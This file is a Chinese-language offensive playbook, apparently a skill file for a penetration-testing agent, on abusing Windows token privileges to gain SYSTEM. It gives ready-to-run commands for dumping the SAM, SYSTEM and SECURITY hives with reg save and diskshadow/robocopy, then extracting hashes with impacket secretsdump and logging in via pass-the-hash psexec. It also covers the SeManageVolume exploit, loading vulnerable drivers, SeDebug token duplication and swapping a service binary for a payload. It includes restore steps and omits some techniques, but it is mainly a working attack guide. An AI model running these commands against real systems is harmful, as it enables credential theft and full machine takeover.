# Windows Token 特权 → SYSTEM / 等价控制

> **TECH：** 滥用已启用的 Windows 特权完成提权或等价于 SYSTEM 的机密读取  
> **IMPACT：** SYSTEM shell，或可读 SAM/SYSTEM 等价本地管理员  
> **对照：** https://github.com/gtworek/Priv2Admin

`whoami /priv` 里 **Enabled** 才算。Disabled 但有的特权，先 `SeDebug` 类工具 enable；多数服务账户默认已 Enabled。

对照表：

| 特权 | 打法 | 成功 |
|---|---|---|
| SeImpersonate / SeAssignPrimaryToken | `potato-family.md` | SYSTEM shell |
| SeBackup + SeRestore | 影子卷 / `reg save` 抽 SAM | 本地管理员哈希 → 登录 |
| SeManageVolume | 拿 `C:\` 写权限 → 劫持 | SYSTEM |
| SeLoadDriver | 加载有洞驱动 | SYSTEM；HVCI/块名单是门 |
| SeDebug | 复制 SYSTEM 进程 token | SYSTEM；不要在这里写完整 LSASS dump |
| SeTakeOwnership | 夺服务文件所有权后替换 | SYSTEM |

---

## SeBackup / SeRestore

Backup Operators 组成员常见。可绕过 DACL 读受保护文件。

### 路径 A — `reg save`（快，有时够）

```cmd
mkdir C:\Users\Public\bak
reg save HKLM\SAM C:\Users\Public\bak\sam
reg save HKLM\SYSTEM C:\Users\Public\bak\system
reg save HKLM\SECURITY C:\Users\Public\bak\security
```

### 路径 B — diskshadow + robocopy /b（文件被锁时）

```cmd
echo set context persistent nowriters > C:\Users\Public\ds.txt
echo add volume C: alias cdrive >> C:\Users\Public\ds.txt
echo create >> C:\Users\Public\ds.txt
echo expose %cdrive% Z: >> C:\Users\Public\ds.txt
diskshadow /s C:\Users\Public\ds.txt

robocopy /b Z:\Windows\System32\config C:\Users\Public\bak SAM
robocopy /b Z:\Windows\System32\config C:\Users\Public\bak SYSTEM
robocopy /b Z:\Windows\System32\config C:\Users\Public\bak SECURITY
```

离线：

```bash
impacket-secretsdump -sam sam -system system -security security LOCAL
```

拿到本地 Administrator 哈希后：

```bash
impacket-psexec -hashes :NTHASH ./Administrator@127.0.0.1
```

本机提权到 admin/SYSTEM 即停。DC 上对 `ntds.dit` 做同样操作是域凭据收割 → 记候选 `/creds` + `/ad-recon`，本文件不写完整 DCSync。

### GATES

当前进程必须真有 SeBackup。`reg save` 失败 `Access denied` → 检查是否只是组显示、实际 token 没启用。

### RESTORE

```cmd
diskshadow
# delete shadows exposed Z:
rmdir /s /q C:\Users\Public\bak
del C:\Users\Public\ds.txt
```

---

## SeManageVolume

公开利用让特权用户获得 `C:\` 根目录写权限，再丢 DLL/假 `C:\Program.exe` / 服务文件。

来源：https://github.com/CsEnox/SeManageVolumeExploit （及 decoder-it 变体）。按当前 README 编译/运行。

```cmd
whoami /priv | findstr SeManageVolume
.\SeManageVolumeExploit.exe
icacls C:\
```

成功后 `C:\` 对当前用户可写。下一步走 `service-dll-task.md` 的无引号路径或 DLL，让 SYSTEM 进程加载 → SYSTEM shell。

不要停在“C:\ 可写”。

### RESTORE

能恢复 ACL 就恢复；否则在 notes 标明 `C:\` DACL 被改过，交操作者决定是否还原。

---

## SeLoadDriver

可加载驱动。常见链：加载已知有洞、未在 HVCI 块名单的驱动 → kernel R/W → SYSTEM。

### GATES（必须先过）

```text
HVCI / Memory Integrity 是否开启
loldrivers.io + Microsoft recommended driver blocklist
当前完整性级别
EDR 是否拦驱动加载
```

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  select CodeIntegrityPolicyEnforcementStatus,HypervisorEnforcedCodeIntegrity
```

HVCI 开、驱动在块名单 → 这条死，不要硬加载。  
加载瞬间被 EDR 杀 → `/edr-bypass`，回来再打，或换 Potato/服务路径。

本 skill **不内置具体 BYOVD 驱动文件名/哈希**。用当时仍未被 blocklist 的公开研究驱动，并记录 IMPACT。这是高影响原语，不是默认第一枪。

成功：得到 SYSTEM token 或 SYSTEM 进程创建。  
RESTORE：卸载驱动、删 `.sys`。可能需要 reboot。

---

## SeDebug

可打开 SYSTEM 进程。提权用 token duplication，不在这里做凭据收割。

概念步骤（工具随仓库变化，以当前 README 为准）：

```text
OpenProcess(winlogon/lsass/services)  # SeDebug
OpenProcessToken + DuplicateTokenEx
CreateProcessWithTokenW → SYSTEM cmd
```

公开实现：`PsGetSystem` / `MiniDumpWriteDump` 类工具的 **spawn SYSTEM** 模式。如果工具只会 dump LSASS，那是 `/creds`，换能 spawn 的。

---

## SeTakeOwnership + 服务文件

```cmd
takeown /f "C:\path\to\service.exe"
icacls "C:\path\to\service.exe" /grant %USERNAME%:F
copy /y service.exe service.exe.bak
copy /y payload.exe service.exe
net stop <svc> & net start <svc>
```

服务必须以 SYSTEM 跑。用户上下文服务只给你用户权限。

RESTORE：`copy /y service.exe.bak service.exe` 并启动。

---

## 其他

```text
SeTcb / SeCreateToken     可直接造 SYSTEM token，极少见；有就按 Priv2Admin
SeRestore                 常与 Backup 成对；单独时可写受保护路径
SeShutdown                只够重启触发服务，不是 SYSTEM
```

HiveNightmare CVE-2021-36934（VSS 下 SAM 对 Users 可读）放 `kernel-lpe.md`，不要求 SeBackup。
